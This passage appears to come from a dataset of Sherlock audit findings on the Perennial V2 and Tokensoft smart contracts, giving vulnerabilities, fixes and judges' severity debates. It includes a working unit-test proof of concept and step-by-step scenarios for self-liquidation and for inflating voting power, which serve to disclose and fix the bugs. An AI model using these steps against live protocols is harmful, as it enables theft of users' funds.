1010000000\ncollateral after liquidation: -100000080 + 550000000 + 550000000 = 999999920\n```\n\nAfter initial total deposit of $1010, in the end liquidated user will just abandon his account, and remaining user accounts have $550+$550=$1100 but only $1000 funds in the protocol to withdraw.\nCode Snippet\nHowever, user with negative collateral will simply abandond the account and shortfall will make it impossible to withdraw for the last users in case of bank run.\nTool used\nManual Review"чThere should be no negative collateral accounts with 0-position and no incentive to cover shortfall. When liquidated, if account is left with negative collateral, the bad debt should be added to the opposite position pnl (long position bad debt should be socialized between short position holders) or maybe to makers pnl only (socialized between makers). The account will have to be left with collateral = 0.\nImplementation details for such solution can be tricky due to settlement in the future (pnl is not known at the time of liquidation initiation). Possibly a 2nd step of bad debt liquidation should be added: a keeper will call the user account to socialize bad debt and get some reward for this. Although this is not the best solution, because users who close their positions before the keeper socializes the bad debt, will be able to avoid this social loss. One of the solutions for this will be to introduce delayed withdrawals and delayed socialization (like withdrawals are allowed only after 5 oracle versions and socialization is applied to all positions opened before socialization and still active or closed within 5 last oracle versions), but it will make protocol much more complicated.\nDiscussion\nsherlock-admin\n1 comment(s) were left on this issue during the judging contest.\n141345 commented:\nm\narjun-io\nWhile we like the recommended approach it might be overly cumbersome to implement and still does not fully prevent the shortfall bank run situation. Bad debt/shortfall is necessary in Perennial and should be thoroughly minimized through correct parameter setting.ч"After ANY bad debt, the protocol collateral for all non-negative users will be higher than protocol funds available, which can cause a bank run and a loss of funds for the users who are the last to withdraw.\nEven if someone covers the shortfall for the user with negative collateral, this doesn't guarantee absence of bank run:\nIf the shortfall is not covered quickly for any reason, the other users can notice disparency between collateral and funds in the protocol and start to withdraw\nIt is possible that bad debt is so high that any entity (""insurance fund"") just won't have enough funds to cover it."
Market: DoS when stuffed with pending protected positionsчmediumч```\n    function _invariant(\n        Context memory context,\n        address account,\n        Order memory newOrder,\n        Fixed6 collateral,\n        bool protected\n    ) private view {\n        // rest of code.\n\n        if (protected) return; // The following invariants do not apply to protected position updates (liquidations)\n        // rest of code.\n            if (\n            context.global.currentId > context.global.latestId + context.marketParameter.maxPendingGlobal ||\n            context.local.currentId > context.local.latestId + context.marketParameter.maxPendingLocal\n        ) revert MarketExceedsPendingIdLimitError();\n        // rest of code.\n    }\n```\nчIn `_invariant`, there is a limit on the number of pending position updates. But for `protected` position updates, `_invariant` returns early and does not trigger this check.\n```\n    function _invariant(\n        Context memory context,\n        address account,\n        Order memory newOrder,\n        Fixed6 collateral,\n        bool protected\n    ) private view {\n        // rest of code.\n\n        if (protected) return; // The following invariants do not apply to protected position updates (liquidations)\n        // rest of code.\n            if (\n            context.global.currentId > context.global.latestId + context.marketParameter.maxPendingGlobal ||\n            context.local.currentId > context.local.latestId + context.marketParameter.maxPendingLocal\n        ) revert MarketExceedsPendingIdLimitError();\n        // rest of code.\n    }\n```\n\nAfter the `_invariant` check, the postion updates will be added into pending position queues.\n```\n        _invariant(context, account, newOrder, collateral, protected);\n\n        // store\n        _pendingPosition[context.global.currentId].store(context.currentPosition.global);\n        _pendingPositions[account][context.local.currentId].store(context.currentPosition.local);\n```\n\nWhen the protocol enters next oracle version, the global pending queue `_pendingPosition` will be settled in a loop.\n```\n    function _settle(Context memory context, address account) private {\n        // rest of code.\n        // settle\n        while (\n            context.global.currentId != context.global.latestId &&\n            (nextPosition = _pendingPosition[context.global.latestId + 1].read()).ready(context.latestVersion)\n        ) _processPositionGlobal(context, context.global.latestId + 1, nextPosition);\n```\n\nThe OOG revert happens if there are too many pending position updates.\nThis revert will happend on every `update` calls because they all need to settle this `_pendingPosition` before `update`.\n```\n    function update(\n        address account,\n        UFixed6 newMaker,\n        UFixed6 newLong,\n        UFixed6 newShort,\n        Fixed6 collateral,\n        bool protect\n    ) external nonReentrant whenNotPaused {\n        Context memory context = _loadContext(account);\n        _settle(context, account);\n        _update(context, account, newMaker, newLong, newShort, collateral, protect);\n        _saveContext(context, account);\n    }\n```\nчEither or both,\nLimit the number of pending protected position updates can be queued in `_invariant`.\nLimit the number of global pending protected postions can be settled in `_settle`.\nDiscussion\nsherlock-admin\n2 comment(s) were left on this issue during the judging contest.\n141345 commented:\nx\npanprog commented:\nmedium because it's actually very hard to create many pending positions and at the same time liquidate: new pending position is only created once time advances by the granularity. If previous pending positions are not still settled, this means there were no oracle commits, this means that market price didn't change and accounts can be liquidated the whole time.\nsyjcnss\nEscalate\nThis should be valid high.\nBecause the impact is critical and should never happen even under edge cases.\nThis DoS does not require an attacker. The protocol could enter such state spontaneously if conditions are met.\nsherlock-admin2\nEscalate\nThis should be valid high.\nBecause the impact is critical and should never happen even under edge cases.\nThis DoS does not require an attacker. The protocol could enter such state spontaneously if conditions are met.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\npanprog\nEscalate\nI agree that this issue is valid. However, it should be medium, not high, because it's actually quite unlikely to enter such state:\nNew pending position (both global and local) is only created when `oracle.current()` timestamp changes. Since it's in granularities, this happens every `granularity` seconds.\nWhenever an oracle version is commited, all pending positions up to that commit are settled. This means that in order to enter such state - there should be a large number of consecutive requested and uncommited oracle versions.\nSince such state can only happen when there is no oracle commit for a long time, this means that all this time the same price is used for liquidation, so all accounts potentially liquidatable are liquidatable for this entire time, and for such state to happen, at least 1 account should be liquidated in each different `granularity` timestamp, which is unlikely - liquidations are more likely to happen all in the first 1-2 oracle versions.\nExample of what has to happen to cause this bug: -- no accounts liquidatable t=120: oracle commits new price for `oracle version` = 100 For example, the price change is high and causes mass liquidations t=130: liquidation (new pending position at timestamp 200, 1 pending position) t=140: liquidation (same pending position at timestamp 200, still 1 pending position) t=150: liquidation (same) ... t=210: liquidation (new pending position at timestamp 200, 2 pending positions) t=220: liquidation (same, 2 pending) ... (no oracle commit for timestamp=200) ... t=310: liquidation (new pending position at timestamp 300, 3 pending positions) ... (no oracle commits for neither timestamps 200, nor 300) t=410: liquidation (4 pending) ... (still no oracle commits) t=510: liquidation (5 pending) ... (still no oracle commits) t=610: liquidation (6 pending -> exceeds pending positions limit)\nSo if pending limit is 5, there should be:\nno oracle commits for at least 4 * granularity seconds\nat least 1 position change request each granularity window\nat least 1 liquidation after 4 * granularity seconds have passed - remember that all 4 * granularity seconds all positions are liquidatable, so they're much more likely to happen earlier rather than after such long period of time.\nThis will allow to exceed the pending limit. However, the real impact (protocol funds get stuck) will likely occur much later after even more oracle versions and liquidations, because it's unlikely that pending limit is set at the edge of transaction max gas limit.\nSo given conditions which are quite rare to occur, but possible, this should be medium.\nsherlock-admin2\nEscalate\nI agree that this issue is valid. However, it should be medium, not high, because it's actually quite unlikely to enter such state:\nNew pending position (both global and local) is only created when `oracle.current()` timestamp changes. Since it's in granularities, this happens every `granularity` seconds.\nWhenever an `oracle version` is commited, all pending positions up to that commit are settled. This means that in order to enter such state - there should be a large number of consecutive requested and uncommited oracle versions.\nSince such state can only happen when there is no oracle commit for a long time, this means that all this time the same price is used for liquidation, so all accounts potentially liquidatable are liquidatable for this entire time, and for such state to happen, at least 1 account should be liquidated in each different `granularity` timestamp, which is unlikely - liquidations are more likely to happen all in the first 1-2 oracle versions.\nExample of what has to happen to cause this bug: -- no accounts liquidatable t=120: oracle commits new price for `oracle version` = 100 For example, the price change is high and causes mass liquidations t=130: liquidation (new pending position at timestamp 200, 1 pending position) t=140: liquidation (same pending position at timestamp 200, still 1 pending position) t=150: liquidation (same) ... t=210: liquidation (new pending position at timestamp 200, 2 pending positions) t=220: liquidation (same, 2 pending) ... (no oracle commit for timestamp=200) ... t=310: liquidation (new pending position at timestamp 300, 3 pending positions) ... (no oracle commits for neither timestamps 200, nor 300) t=410: liquidation (4 pending) ... (still no oracle commits) t=510: liquidation (5 pending) ... (still no oracle commits) t=610: liquidation (6 pending -> exceeds pending positions limit)\nSo if pending limit is 5, there should be:\nno oracle commits for at least 4 * `granularity` seconds\nat least 1 position change request each `granularity` window\nat least 1 liquidation after 4 * `granularity` seconds have passed - remember that all 4 * `granularity` seconds all positions are liquidatable, so they're much more likely to happen earlier rather than after such long period of time.\nThis will allow to exceed the pending limit. However, the real impact (protocol funds get stuck) will likely occur much later after even more oracle versions and liquidations, because it's unlikely that pending limit is set at the edge of transaction max gas limit.\nSo given conditions which are quite rare to occur, but possible, this should be medium.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nsyjcnss\nI agree with @panprog on his 1,2,3 explainations on why `it's actually quite unlikely to enter such state`.\nI think it should be high because there is NO attacker/special setup(i.e., `pending limit is set at the edge of transaction max gas limit` in @panprog's comment) required for this locking of fund to happen.\npanprog\nI agree that this state can happen by itself without special setup or attacker, but the likelihood is very low, that's why it's medium. Refer to sherlock rules on how to identify high and medium issues, high issues do not require limiting external conditions, medium issues require certain external conditions or specific states - that's exactly the case for this issue.\nhttps://docs.sherlock.xyz/audits/judging/judging#how-to-identify-a-high-issue\nHow to identify a high issue:\nDefinite loss of funds without limiting external conditions.\nBreaks core contract functionality, rendering the protocol/contract useless (should not be easily replaced without loss of funds) and definitely causes significant loss of funds.\nSignificant loss of funds/large profit for the attacker at a minimal cost.\nHow to identify a medium issue:\nCauses a loss of funds but requires certain external conditions or specific states.\nBreaks core contract functionality, rendering the contract useless (should not be easily replaced without loss of funds) or leading to unknown potential exploits/loss of funds. Eg: Unable to remove malicious user/collateral from the contract.\nA material loss of funds, no/minimal profit for the attacker at a considerable cost\nsyjcnss\nDon't think `medium issues require certain external conditions or specific states` applies to this one.\nThe conditions are that untrusted 3rd-party liquidators&keepers behave non-ideally(slow liquidation&price commit) under massive liquidations which should be considered met. And once is all it takes to lock fund.\narjun-io\nThis is a valid state that can occur so in our view this is a valid issue. However, we agree that there is a very low likelihood that this can occur with correct parameters set for the market\nsyjcnss\nThe likelihood is low but the result is untolerable.\nThe protocol is relying on untrusted 3rd parties to prevent this from happenning. The probability increases under congested network conditions and low liquidator/keeper performance.\nDespite the severity of this issue in the contest I suggest to have a fix.\n141345\nThe condition for this to be valid is strict. With long granularity, and large number of pending positions. For a malicious user, there is cost of the position and potential risk. The likelihood for it to happen by user self is even lower. Seems medium severity according to the criteria.\nhrishibhat\nResult: Medium Unique Agree with the above Escalation and the comment on why this issue should be valid medium. https://github.com/sherlock-audit/2023-07-perennial-judging/issues/94#issuecomment-1697453789\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nsyjcnss: accepted\npanprog: acceptedчThe protocol will be fully unfunctional and funds will be locked. There will be no recover to this DoS.\nA malicious user can tigger this intentionally at very low cost. Alternatively, this can occur during a volatile market period when there are massive liquidations.\nCode Snippet\nTool used\nManual Review
It is possible to open and liquidate your own position in 1 transaction to overcome efficiency and liquidity removal limits at almost no costчmediumч"```\nit('panprog liquidate unsuspecting user / self in 1 transaction', async () => {\n\n    function setupOracle(price: string, timestamp : number, nextTimestamp : number) {\n        const oracleVersion = {\n        price: parse6decimal(price),\n        timestamp: timestamp,\n        valid: true,\n        }\n        oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion)\n        oracle.status.returns([oracleVersion, nextTimestamp])\n        oracle.request.returns()\n    }\n\n    var riskParameter = {\n        maintenance: parse6decimal('0.2'),\n        takerFee: parse6decimal('0.00'),\n        takerSkewFee: 0,\n        takerImpactFee: 0,\n        makerFee: parse6decimal('0.00'),\n        makerImpactFee: 0,\n        makerLimit: parse6decimal('1000'),\n        efficiencyLimit: parse6decimal('0.2'),\n        liquidationFee: parse6decimal('0.50'),\n        minLiquidationFee: parse6decimal('10'),\n        maxLiquidationFee: parse6decimal('1000'),\n        utilizationCurve: {\n        minRate: parse6decimal('0.0'),\n        maxRate: parse6decimal('1.00'),\n        targetRate: parse6decimal('0.10'),\n        targetUtilization: parse6decimal('0.50'),\n        },\n        pController: {\n        k: parse6decimal('40000'),\n        max: parse6decimal('1.20'),\n        },\n        minMaintenance: parse6decimal('10'),\n        virtualTaker: parse6decimal('0'),\n        staleAfter: 14400,\n        makerReceiveOnly: false,\n    }\n    var marketParameter = {\n        fundingFee: parse6decimal('0.0'),\n        interestFee: parse6decimal('0.0'),\n        oracleFee: parse6decimal('0.0'),\n        riskFee: parse6decimal('0.0'),\n        positionFee: parse6decimal('0.0'),\n        maxPendingGlobal: 5,\n        maxPendingLocal: 3,\n        settlementFee: parse6decimal('0'),\n        makerRewardRate: parse6decimal('0'),\n        longRewardRate: parse6decimal('0'),\n        shortRewardRate: parse6decimal('0'),\n        makerCloseAlways: false,\n        takerCloseAlways: false,\n        closed: false,\n    }\n        \n    await market.connect(owner).updateRiskParameter(riskParameter);\n    await market.connect(owner).updateParameter(marketParameter);\n\n    setupOracle('100', TIMESTAMP, TIMESTAMP + 100);\n\n    var collateral = parse6decimal('1000')\n    dsu.transferFrom.whenCalledWith(userB.address, market.address, collateral.mul(1e12)).returns(true)\n    await market.connect(userB).update(userB.address, parse6decimal('10.000'), 0, 0, collateral, false)\n\n    var collateral = parse6decimal('100')\n    dsu.transferFrom.whenCalledWith(user.address, market.address, collateral.mul(1e12)).returns(true)\n    await market.connect(user).update(user.address, 0, parse6decimal('1.000'), 0, collateral, false)\n\n    // settle\n    setupOracle('100', TIMESTAMP + 100, TIMESTAMP + 200);\n    await market.connect(userB).update(userB.address, parse6decimal('10.000'), 0, 0, 0, false)\n    await market.connect(user).update(user.address, 0, parse6decimal('1.000'), 0, 0, false)\n\n    // withdraw\n    var collateral = parse6decimal('800')\n    dsu.transfer.whenCalledWith(userB.address, collateral.mul(1e12)).returns(true)\n    await market.connect(userB).update(userB.address, parse6decimal('2.000'), 0, 0, collateral.mul(-1), false)\n\n    // liquidate unsuspecting user\n    setupOracle('100.01', TIMESTAMP + 150, TIMESTAMP + 200);\n    const EXPECTED_LIQUIDATION_FEE = parse6decimal('100.01')\n    dsu.transfer.whenCalledWith(liquidator.address, EXPECTED_LIQUIDATION_FEE.mul(1e12)).returns(true)\n    dsu.balanceOf.whenCalledWith(market.address).returns(COLLATERAL.mul(1e12))\n    await market.connect(liquidator).update(userB.address, 0, 0, 0, EXPECTED_LIQUIDATION_FEE.mul(-1), true)\n\n    setupOracle('100.01', TIMESTAMP + 200, TIMESTAMP + 300);\n    await market.connect(userB).update(userB.address, 0, 0, 0, 0, false)\n\n    var info = await market.locals(userB.address);\n    var pos = await market.positions(userB.address);\n    console.log(""Liquidated maker: collateral = "" + info.collateral + "" maker = "" + pos.maker);\n\n})\n```\n"ч"The user can liquidate his own position with 100% guarantee in 1 transaction by following these steps:\nIt can be done on existing position or on a new position\nRecord Pyth oracle prices with signatures until you encounter a price which is higher (or lower, depending on your position direction) than latest oracle version price by any amount.\nIn 1 transaction do the following: 3.1. Make the position you want to liquidate at exactly the edge of liquidation: withdraw maximum allowed amount or open a new position with minimum allowed collateral 3.2. Commit non-requested oracle version with the price recorded earlier (this price makes the position liquidatable) 3.3. Liquidate your position (it will be allowed, because the position generates a minimum loss due to price change and becomes liquidatable)\nSince all liquidation fee is given to user himself, liquidation of own position is almost free for the user (only the keeper and position open/close fee is paid if any).\nThe scenario of liquidating unsuspecting user is demonstrated in the test, add this to test/unit/market/Market.test.ts:\n```\nit('panprog liquidate unsuspecting user / self in 1 transaction', async () => {\n\n    function setupOracle(price: string, timestamp : number, nextTimestamp : number) {\n        const oracleVersion = {\n        price: parse6decimal(price),\n        timestamp: timestamp,\n        valid: true,\n        }\n        oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion)\n        oracle.status.returns([oracleVersion, nextTimestamp])\n        oracle.request.returns()\n    }\n\n    var riskParameter = {\n        maintenance: parse6decimal('0.2'),\n        takerFee: parse6decimal('0.00'),\n        takerSkewFee: 0,\n        takerImpactFee: 0,\n        makerFee: parse6decimal('0.00'),\n        makerImpactFee: 0,\n        makerLimit: parse6decimal('1000'),\n        efficiencyLimit: parse6decimal('0.2'),\n        liquidationFee: parse6decimal('0.50'),\n        minLiquidationFee: parse6decimal('10'),\n        maxLiquidationFee: parse6decimal('1000'),\n        utilizationCurve: {\n        minRate: parse6decimal('0.0'),\n        maxRate: parse6decimal('1.00'),\n        targetRate: parse6decimal('0.10'),\n        targetUtilization: parse6decimal('0.50'),\n        },\n        pController: {\n        k: parse6decimal('40000'),\n        max: parse6decimal('1.20'),\n        },\n        minMaintenance: parse6decimal('10'),\n        virtualTaker: parse6decimal('0'),\n        staleAfter: 14400,\n        makerReceiveOnly: false,\n    }\n    var marketParameter = {\n        fundingFee: parse6decimal('0.0'),\n        interestFee: parse6decimal('0.0'),\n        oracleFee: parse6decimal('0.0'),\n        riskFee: parse6decimal('0.0'),\n        positionFee: parse6decimal('0.0'),\n        maxPendingGlobal: 5,\n        maxPendingLocal: 3,\n        settlementFee: parse6decimal('0'),\n        makerRewardRate: parse6decimal('0'),\n        longRewardRate: parse6decimal('0'),\n        shortRewardRate: parse6decimal('0'),\n        makerCloseAlways: false,\n        takerCloseAlways: false,\n        closed: false,\n    }\n        \n    await market.connect(owner).updateRiskParameter(riskParameter);\n    await market.connect(owner).updateParameter(marketParameter);\n\n    setupOracle('100', TIMESTAMP, TIMESTAMP + 100);\n\n    var collateral = parse6decimal('1000')\n    dsu.transferFrom.whenCalledWith(userB.address, market.address, collateral.mul(1e12)).returns(true)\n    await market.connect(userB).update(userB.address, parse6decimal('10.000'), 0, 0, collateral, false)\n\n    var collateral = parse6decimal('100')\n    dsu.transferFrom.whenCalledWith(user.address, market.address, collateral.mul(1e12)).returns(true)\n    await market.connect(user).update(user.address, 0, parse6decimal('1.000'), 0, collateral, false)\n\n    // settle\n    setupOracle('100', TIMESTAMP + 100, TIMESTAMP + 200);\n    await market.connect(userB).update(userB.address, parse6decimal('10.000'), 0, 0, 0, false)\n    await market.connect(user).update(user.address, 0, parse6decimal('1.000'), 0, 0, false)\n\n    // withdraw\n    var collateral = parse6decimal('800')\n    dsu.transfer.whenCalledWith(userB.address, collateral.mul(1e12)).returns(true)\n    await market.connect(userB).update(userB.address, parse6decimal('2.000'), 0, 0, collateral.mul(-1), false)\n\n    // liquidate unsuspecting user\n    setupOracle('100.01', TIMESTAMP + 150, TIMESTAMP + 200);\n    const EXPECTED_LIQUIDATION_FEE = parse6decimal('100.01')\n    dsu.transfer.whenCalledWith(liquidator.address, EXPECTED_LIQUIDATION_FEE.mul(1e12)).returns(true)\n    dsu.balanceOf.whenCalledWith(market.address).returns(COLLATERAL.mul(1e12))\n    await market.connect(liquidator).update(userB.address, 0, 0, 0, EXPECTED_LIQUIDATION_FEE.mul(-1), true)\n\n    setupOracle('100.01', TIMESTAMP + 200, TIMESTAMP + 300);\n    await market.connect(userB).update(userB.address, 0, 0, 0, 0, false)\n\n    var info = await market.locals(userB.address);\n    var pos = await market.positions(userB.address);\n    console.log(""Liquidated maker: collateral = "" + info.collateral + "" maker = "" + pos.maker);\n\n})\n```\n\nConsole output for the code:\n```\nLiquidated maker: collateral = 99980000 maker = 0\n```\n\nSelf liquidation is the same, just the liquidator does this in 1 transaction and is owned by userB.\nCode Snippet\nIt is possible to bring user to exactly the edge of liquidation, when minimum loss makes him liquidatable.\nTool used\nManual Review"чIndustry standard is to have initial margin (margin required to open position or withdraw collateral) and maintenance margin (margin required to keep the position solvent). Initial margin > maintenance margin and serves exactly for the reason to prevent users from being close to liquidation, intentional or not. I suggest to implement initial margin as a measure to prevent such self liquidation or unsuspected user liquidations. This will improve user experience (remove a lot of surprise liquidations) and will also improve security by disallowing intentional liquidations and cheaply overcoming the protocol limits such as efficiency limit: intentional liquidations are never good for the protocol as they're most often malicious, so having the ability to liquidate yourself in 1 transaction should definetely be prohibited.\nDiscussion\nsherlock-admin\n1 comment(s) were left on this issue during the judging contest.\n141345 commented:\nm\narjun-io\nThe self liquidations do seem possible here, we'll look further into the downstream impacts to figure out any fixes we want to implement.\narjun-io\nFixed: https://github.com/equilibria-xyz/perennial-v2/pull/92чThere are different malicious actions scenarios possible which can abuse this issue and overcome efficiency and liquidity removal limitations (as they're ignored when liquidating positions), such as:\nOpen large maker and long or short position, then liquidate maker to cause mismatch between long/short and maker (socialize positions). This will cause some chaos in the market, disbalance between long and short profit/loss and users will probably start leaving such chaotic market, so while this attack is not totally free, it's cheap enough to drive users away from competition.\nOpen large maker, wait for long and/or short positions from normal users to accumulate, then liquidate most of the large maker position, which will drive taker interest very high and remaining small maker position will be able to accumulate big profit with a small risk.\nJust open long/short position from different accounts and wait for the large price update and frontrun it by withdrawing max collateral from the position which will be in a loss, and immediately liquidate it in the same transaction: with large price update one position will be liquidated with bad debt while the other position will be in a large profit, total profit from both positions will be positive and basically risk-free, meaning it's at the expense of the other users. While this strategy is possible to do on its own, liquidation in the same transaction allows it to be more profitable and catch more opportunities, meaning more damage to the other protocol users.\nThe same core reason can also cause unsuspecting user to be unexpectedly liquidated in the following scenario:\nUser opens position (10 ETH long at $1000, with $10000 collateral). User is choosing very safe leverage = 1. Market maintenance is set to 20% (max leverage = 5)\nSome time later the price is still $1000 and user decides to close most of his position and withdraw collateral, so he reduces his position to 2 ETH long and withdraws $8000 collateral, leaving his position with $2000 collateral. It appears that the user is at the safe leverage = 1 again.\nRight in the same block the liquidator commits non-requested oracle with a price $999.999 and immediately liquidates the user.\nThe user is unsuspectedly liquidated even though he thought that he was at leverage = 1. But since collateral is withdrawn immediately, but position changes only later, user actually brought his position to max leverage and got liquidated. While this might be argued to be the expected behavior, it might still be hard to understand and unintuitive for many users, so it's better to prevent such situation from happening and the fix is the same as the one to fix self-liquidations.
update() wrong privilege controlчmediumч```\ncontract OracleFactory is IOracleFactory, Factory {\n// rest of code\n    function update(bytes32 id, IOracleProviderFactory factory) external onlyOwner {\n        if (!factories[factory]) revert OracleFactoryNotRegisteredError();\n        if (oracles[id] == IOracleProvider(address(0))) revert OracleFactoryNotCreatedError();\n\n        IOracleProvider oracleProvider = factory.oracles(id);\n        if (oracleProvider == IOracleProvider(address(0))) revert OracleFactoryInvalidIdError();\n\n        IOracle oracle = IOracle(address(oracles[id]));\n      oracle.update(oracleProvider);\n    }\n```\nчin `OracleFactory.update()` will call `oracle.update()`\n```\ncontract OracleFactory is IOracleFactory, Factory {\n// rest of code\n    function update(bytes32 id, IOracleProviderFactory factory) external onlyOwner {\n        if (!factories[factory]) revert OracleFactoryNotRegisteredError();\n        if (oracles[id] == IOracleProvider(address(0))) revert OracleFactoryNotCreatedError();\n\n        IOracleProvider oracleProvider = factory.oracles(id);\n        if (oracleProvider == IOracleProvider(address(0))) revert OracleFactoryInvalidIdError();\n\n        IOracle oracle = IOracle(address(oracles[id]));\n      oracle.update(oracleProvider);\n    }\n```\n\nBut `oracle.update()` permission is needed for `OracleFactory.owner()` and not `OracleFactory` itself.\n```\n  function update(IOracleProvider newProvider) external onlyOwner {\n        _updateCurrent(newProvider);\n        _updateLatest(newProvider.latest());\n    }\n\n    modifier onlyOwner {\n      if (msg.sender != factory().owner()) revert InstanceNotOwnerError(msg.sender);\n        _;\n    }\n```\n\nThis results in `OracleFactory` not being able to do `update()`. Suggest changing the limit of `oracle.update()` to `factory()`.ч"```\ncontract Oracle is IOracle, Instance {\n// rest of code\n\n-   function update(IOracleProvider newProvider) external onlyOwner {\n+   function update(IOracleProvider newProvider) external {\n+       require(msg.sender == factory(),""invalid sender"");\n        _updateCurrent(newProvider);\n        _updateLatest(newProvider.latest());\n    }\n```\n\nDiscussion\nsherlock-admin\n1 comment(s) were left on this issue during the judging contest.\n141345 commented:\nm\narjun-io\nFixed: https://github.com/equilibria-xyz/perennial-v2/pull/81"ч`OracleFactory.update()` unable to add `IOracleProvider`\nCode Snippet\nTool used\nManual Review
`_accumulateFunding()` maker will get the wrong amount of funding fee.чmediumч```\n// Redirect net portion of minor's side to maker\nif (fromPosition.long.gt(fromPosition.short)) {\n    fundingValues.fundingMaker = fundingValues.fundingShort.mul(Fixed6Lib.from(fromPosition.skew().abs()));\n    fundingValues.fundingShort = fundingValues.fundingShort.sub(fundingValues.fundingMaker);\n}\nif (fromPosition.short.gt(fromPosition.long)) {\n    fundingValues.fundingMaker = fundingValues.fundingLong.mul(Fixed6Lib.from(fromPosition.skew().abs()));\n    fundingValues.fundingLong = fundingValues.fundingLong.sub(fundingValues.fundingMaker);\n}\n```\nчThe formula that calculates the amount of funding in `Version#_accumulateFunding()` on the maker side is incorrect. This leads to an incorrect distribution of funding between the minor and the maker's side.\n```\n// Redirect net portion of minor's side to maker\nif (fromPosition.long.gt(fromPosition.short)) {\n    fundingValues.fundingMaker = fundingValues.fundingShort.mul(Fixed6Lib.from(fromPosition.skew().abs()));\n    fundingValues.fundingShort = fundingValues.fundingShort.sub(fundingValues.fundingMaker);\n}\nif (fromPosition.short.gt(fromPosition.long)) {\n    fundingValues.fundingMaker = fundingValues.fundingLong.mul(Fixed6Lib.from(fromPosition.skew().abs()));\n    fundingValues.fundingLong = fundingValues.fundingLong.sub(fundingValues.fundingMaker);\n}\n```\n\nPoC\nGiven:\nlong/major: 1000\nshort/minor: 1\nmaker: 1\nThen:\nskew(): 999/1000\nfundingMaker: 0.999 of the funding\nfundingShort: 0.001 of the funding\nWhile the maker only matches for `1` of the major part and contributes to half of the total short side, it takes the entire funding.чThe correct formula to calculate the amount of funding belonging to the maker side should be:\n```\nfundingMakerRatio = min(maker, major - minor) / min(major, minor + maker)\nfundingMaker = fundingMakerRatio * fundingMinor\n```\n\nDiscussion\nsherlock-admin\n2 comment(s) were left on this issue during the judging contest.\n141345 commented:\nm\npanprog commented:\nmedium because incorrect result only starts appearing if abs(long-short) > maker and the larger the difference, the more incorrect the split of funding is. But this situation is exceptional case, most of the time abs(long-short) < maker due to efficiency and liquidity limits\narjun-io\nWe'd like to re-open this as it does appear to be a valid issue. Medium severity seems correct here\narjun-io\nFixed: https://github.com/equilibria-xyz/perennial-v2/pull/64чCode Snippet\nTool used\nManual Review
""Votes"" balance can be increased indefinitely in multiple contracts"чhighч```\n  function initializeDistributionRecord(\n    uint32 _domain, // the domain of the beneficiary\n    address _beneficiary, // the address that will receive tokens\n    uint256 _amount, // the total claimable by this beneficiary\n    bytes32[] calldata merkleProof\n  ) external validMerkleProof(_getLeaf(_beneficiary, _amount, _domain), merkleProof) {\n    _initializeDistributionRecord(_beneficiary, _amount);\n  }\n```\nч"The ""voting power"" can be easily manipulated in the following contracts:\n`ContinuousVestingMerkle`\n`PriceTierVestingMerkle`\n`PriceTierVestingSale_2_0`\n`TrancheVestingMerkle`\n`CrosschainMerkleDistributor`\n`CrosschainContinuousVestingMerkle`\n`CrosschainTrancheVestingMerkle`\nAll the contracts inheriting from the contracts listed above\nThis is caused by the public `initializeDistributionRecord()` function that can be recalled multiple times without any kind of access control:\n```\n  function initializeDistributionRecord(\n    uint32 _domain, // the domain of the beneficiary\n    address _beneficiary, // the address that will receive tokens\n    uint256 _amount, // the total claimable by this beneficiary\n    bytes32[] calldata merkleProof\n  ) external validMerkleProof(_getLeaf(_beneficiary, _amount, _domain), merkleProof) {\n    _initializeDistributionRecord(_beneficiary, _amount);\n  }\n```\n\nThe `AdvancedDistributor` abstract contract which inherits from the `ERC20Votes`, `ERC20Permit` and `ERC20` contracts, distributes tokens to beneficiaries with voting-while-vesting and administrative controls. Basically, before the tokens are vested/claimed by a certain group of users, these users can use these `ERC20` tokens to vote. These tokens are minted through the `_initializeDistributionRecord()` function:\n```\n  function _initializeDistributionRecord(\n    address beneficiary,\n    uint256 totalAmount\n  ) internal virtual override {\n    super._initializeDistributionRecord(beneficiary, totalAmount);\n\n    // add voting power through ERC20Votes extension\n    _mint(beneficiary, tokensToVotes(totalAmount));\n  }\n```\n\nAs mentioned in the Tokensoft Discord channel these ERC20 tokens minted are used to track an address's unvested token balance, so that other projects can utilize 'voting while vesting'.\nA user can simply call as many times as he wishes the `initializeDistributionRecord()` function with a valid merkle proof. With each call, the `totalAmount` of tokens will be minted. Then, the user simply can call `delegate()` and delegate those votes to himself, ""recording"" the inflated voting power."ч"
`SafeERC20.safeApprove` reverts for changing existing approvalsчmediumч```\n        // safeApprove should only be called when setting an initial allowance,\n        // or when resetting it to zero. To increase and decrease it, use\n        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'\n```\nч`SafeERC20.safeApprove` reverts when a non-zero approval is changed to a non-zero approval. The `CrosschainDistributor._setTotal` function tries to change an existing approval to a non-zero value which will revert.\nThe safeApprove function has explicit warning:\n```\n        // safeApprove should only be called when setting an initial allowance,\n        // or when resetting it to zero. To increase and decrease it, use\n        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'\n```\n\nBut still the `_setTotal` use it to change approval amount:\n```\n  function _allowConnext(uint256 amount) internal {\n    token.safeApprove(address(connext), amount);\n  }\n\n  /** Reset Connext allowance when total is updated */\n  function _setTotal(uint256 _total) internal virtual override onlyOwner {\n    super._setTotal(_total);\n    _allowConnext(total - claimed);\n  }\n```\nч
